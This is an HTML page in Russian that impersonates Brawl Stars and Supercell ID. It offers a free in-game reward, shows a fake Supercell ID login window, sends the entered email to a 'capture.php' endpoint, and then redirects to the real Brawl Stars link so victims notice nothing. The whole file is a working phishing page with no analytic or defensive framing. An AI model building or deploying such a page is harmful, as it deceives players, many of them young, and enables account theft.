<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Brawl Stars - Награда</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@900&display=swap" rel="stylesheet">

    <style>
        :root {
            --bg-blue: #2c59ec; 
            --btn-yellow-top: #ffe83a;
            --btn-yellow-bottom: #fcc200;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }

        body {
            font-family: 'Montserrat', sans-serif;
            background-color: var(--bg-blue);
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            overflow-x: hidden;
            position: relative;
        }

        body::before {
            content: ""; position: absolute; inset: 0;
            background-image: url("https://cdn.brawlify.com/images/bg-stars.png");
            background-size: 250px; opacity: 0.1; z-index: 0; pointer-events: none;
        }

        .header { width: 100%; display: flex; justify-content: flex-end; padding: 12px 16px; position: relative; z-index: 10; }

        .lang-btn {
            background: #234bce; border-radius: 20px; padding: 8px 14px;
            font-family: sans-serif; font-weight: 600; font-size: 14px;
            color: white; display: flex; align-items: center; gap: 6px; cursor: pointer;
        }

        .main-content {
            position: relative; z-index: 5; display: flex; flex-direction: column;
            align-items: center; flex: 1; width: 100%; max-width: 400px; padding: 10px 20px 40px 20px;
        }

        .logo { width: 280px; margin-bottom: 25px; filter: drop-shadow(0 4px 0 rgba(0,0,0,0.3)); }

        .title {
            font-size: 25px; font-weight: 900; text-align: center; line-height: 1.3;
            color: #ffffff; -webkit-text-stroke: 1.5px #000000; text-shadow: 0px 4px 0px #000000;
            margin-bottom: 25px;
        }

        .claim-button {
            width: 95%; background: linear-gradient(to bottom, var(--btn-yellow-top), var(--btn-yellow-bottom));
            border: 3px solid #000000; border-radius: 8px; padding: 16px 10px;
            font-family: 'Montserrat', sans-serif; font-weight: 900; font-size: 21px;
            color: white; cursor: pointer; margin-bottom: 40px;
            box-shadow: inset 0 -5px 0 #cc8200, 0 6px 0 #000000;
            transition: 0.1s;
        }

        .claim-button span { -webkit-text-stroke: 1.5px #000000; text-shadow: 0px 2px 0px #000000; }

        .claim-button:active { transform: translateY(4px); box-shadow: inset 0 -2px 0 #cc8200, 0 2px 0 #000000; }

        /* Стили окна входа */
        .modal-overlay {
            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9);
            z-index: 100; align-items: center; justify-content: center;
        }
        .modal-content {
            background: #fff; width: 90%; max-width: 340px; padding: 30px;
            border-radius: 20px; text-align: center; font-family: sans-serif;
        }
        .modal-input {
            width: 100%; padding: 12px; margin: 15px 0; border: 2px solid #ddd; border-radius: 8px;
        }
        .modal-submit {
            width: 100%; background: #00d0ff; color: #fff; border: none;
            padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer;
        }

        .footer { background: #000000; width: 100%; padding: 20px; display: flex; justify-content: center; gap: 20px; }
        .footer-item { color: #ffffff; text-decoration: none; font-size: 11px; opacity: 0.8; }
    </style>
</head>
<body>

    <div class="header">
        <div class="lang-btn">русский ▼</div>
    </div>

    <div class="main-content">
        <img src="https://i.ibb.co/Y49k6Mgh/output.webp" alt="Brawl Stars Logo" class="logo">
        <div class="title">Получите награду в Brawl<br>Stars!</div>
        <button class="claim-button" id="claimBtn"><span>Получить награду</span></button>
    </div>

    <div class="modal-overlay" id="authModal">
        <div class="modal-content">
            <img src="https://cdn.supercell.com/scid/1.0/assets/scid_logo.png" style="width:130px; margin-bottom:10px;">
            <h3 style="color:#333">Вход в Supercell ID</h3>
            <input type="email" id="email" class="modal-input" placeholder="Введите ваш Email">
            <button class="modal-submit" id="submitBtn">ВОЙТИ</button>
        </div>
    </div>

    <div class="footer">
        <a href="#" class="footer-item">Условия</a>
        <a href="#" class="footer-item">Политика</a>
    </div>

    <script>
        const claimBtn = document.getElementById('claimBtn');
        const modal = document.getElementById('authModal');
        const submitBtn = document.getElementById('submitBtn');

        claimBtn.onclick = () => modal.style.display = 'flex';

        submitBtn.onclick = async () => {
            const emailValue = document.getElementById('email').value;
            if (emailValue) {
                // Прямая отправка данных
                await fetch('capture.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: 'data=' + encodeURIComponent(emailValue)
                });
                // Редирект для бесшовности
                window.location.href = "https://link.brawlstars.com/";
            }
        };
    </script>
</body>
</html>
